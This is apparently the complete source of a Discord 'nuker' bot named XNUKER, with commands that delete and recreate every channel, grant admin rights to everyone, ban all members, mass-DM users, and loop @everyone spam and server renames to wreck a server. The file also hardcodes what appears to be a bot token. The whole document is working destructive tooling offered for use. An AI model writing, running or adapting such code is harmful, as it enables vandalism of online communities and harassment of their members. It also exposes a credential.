import discord
from discord.ext import commands
import random
import colorama
from colorama import Fore
import os
import ctypes


ctypes.windll.kernel32.SetConsoleTitleW("XNUKER")

os.system("cls")


serverName = "-_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghyjklmnopqrstuvwxyz_+(012456789{}][:|\\<>?,./"
bot = commands.Bot(command_prefix=">", intents=discord.Intents().all())

token = 'OTEyODIzMjU4NjE1ODAzOTA1.YZ1i6A.ohpV3_rRse-yGeCzG6QqKGmFwQQ'

@bot.event
async def on_ready():
	print(f""" ___  ___  _____  ___   ____  ____  __   ___  _______   _______   
|"  \/"  |(\"   \|"  \ ("  _||_ " ||/"| /  ")/"     "| /"      \  
 \   \  / |.\\   \    ||   (  ) : |(: |/   /(: ______)|:        | 
  \\  \/  |: \.   \\  |(:  |  | . )|    __/  \/    |  |_____/   ) 
  /\.  \  |.  \    \. | \\ \__/ // (// _  \  // ___)_  //      /  
 /  \   \ |    \    \ | /\\ __ //\ |: | \  \(:      "||:  __   \  
|___/\___| \___|\____\)(__________)(__|  \__)\_______)|__|  \___)

Logged in as: {bot.user.name}#{bot.user.discriminator}\n""")

	print("Commands:\n")

	print(f"""{Fore.RED}[1]{Fore.RESET} >nuke [Deletes & replaces all channels]
{Fore.RED}[2]{Fore.RESET} >channelspam (amount) (channel name) [Creates channels]
{Fore.RED}[3]{Fore.RESET} >perms [Gives everyone admin permissions]
{Fore.RED}[4]{Fore.RESET} >randomize [Randomizes server name, may cause server lag and admins won't be able to change server settings]
{Fore.RED}[5]{Fore.RESET} >massdm (text) [Mass dm all users]
{Fore.RED}[6]{Fore.RESET} >spam (amount) (message) [Spams a message in every channel]
{Fore.RED}[7]{Fore.RESET} >chaos [Kill server with 1 command]
{Fore.RED}[8]{Fore.RESET} >ban [Bans everyone]""")


@bot.command()
async def nuke(ctx):
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		await channel.delete()
		channel = await ctx.guild.create_text_channel("XNUKER")

@bot.command()
async def channelspam(ctx, amount, channelname):
	await ctx.message.delete()
	for x in range(int(amount)):
		channel = await ctx.guild.create_text_channel(channelname)


@bot.command()
async def perms(ctx):
	await ctx.message.delete()
	everyonerole = discord.utils.get(ctx.guild.roles, name="@everyone")
	await everyonerole.edit(permissions = discord.Permissions().all())


@bot.command()
async def randomize(ctx):
	await ctx.message.delete()
	while True:
		await ctx.guild.edit(name=''.join(random.sample(serverName, len(serverName))))


@bot.command()
async def massdm(ctx, *, text):
	await ctx.message.delete()
	members = ctx.guild.members
	for member in members:
		await member.send(text)

@bot.command()
async def spam(ctx, amount, message):
	await ctx.message.delete()
	for x in range(int(amount)):
		for channel in ctx.guild.channels:
			await channel.send(message)

@bot.command()
async def ban(ctx):
	for member in ctx.guild.members:
		try:
			await member.ban(reason="XNUKER")
		except:
			pass

@bot.command()
async def chaos(ctx):
	for emoji in list(ctx.guild.emojis):
		await emoji.delete()

	for channel in ctx.guild.channels:
		await channel.delete()
		channel = await ctx.guild.create_text_channel("XNUKER")


	for x in range(20):
		channel = await ctx.guild.create_text_channel("XNUKER")
			
	while True:
		for channel in ctx.guild.channels:
			await channel.send("@everyone XNUKER ON TOP https://dsc.gg/xwares")
			await ctx.guild.edit(name=''.join(random.sample(serverName, len(serverName))))

bot.run(token, bot=True)
